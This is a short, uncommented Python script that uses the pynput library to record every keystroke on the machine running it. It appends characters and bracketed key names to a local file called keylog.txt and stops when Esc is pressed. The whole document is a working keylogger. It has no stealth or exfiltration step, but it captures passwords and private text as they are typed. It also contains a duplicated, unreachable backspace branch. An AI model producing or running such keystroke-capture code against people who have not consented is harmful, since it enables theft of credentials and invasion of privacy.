from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.backspace:
                f.write("[BACKSPACE]")
            elif key == keyboard.Key.backspace:
                pass
            else:
                f.write(f"[{key}]")
                

def on_release(key):
    if key == keyboard.Key.esc:
        return False


listener = keyboard.Listener(on_press=on_press,on_release=on_release)
listener.start() 
listener.join()


